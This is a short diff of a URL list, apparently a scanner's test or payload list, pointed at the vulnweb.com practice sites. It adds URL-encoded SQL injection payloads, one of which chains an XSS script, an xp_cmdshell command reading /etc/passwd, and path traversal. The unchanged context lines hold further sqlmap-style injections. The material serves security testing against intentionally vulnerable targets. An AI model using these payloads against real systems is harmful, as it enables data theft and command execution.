@@ -21,7 +21,8 @@ http://testhtml5.vulnweb.com/comment?id=011dc54012e965efaf58a4fc21785602
 http://testhtml5.vulnweb.com/like?id=011dc54012e965efaf58a4fc21785602
 http://testhtml5.vulnweb.com/report?id=011dc54012e965efaf58a4fc21785602
 http://testpho.vulnweb.com:80/comment.php?aid=1
-http://testphp.vulnweb.com/?%3Fid=1
+http://testphp.vulnweb.com/?%3Fid=%28SELECT%20%28CASE%20WHEN%20%281528%3D9439%29%20THEN%201%20ELSE%20%28SELECT%209439%20UNION%20SELECT%202819%29%20END%29%29
+http://testphp.vulnweb.com/?%3Fid=1&uHiF=6004%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
 http://testphp.vulnweb.com/?id=1%2F%2A!50000OR%2A%2F1
 http://testphp.vulnweb.com/AJAX/infoartist.php?id=%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176716271%2C%28SELECT%20%28ELT%287432%3D7432%2C1%29%29%29%2C0x716b786b71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29
 http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
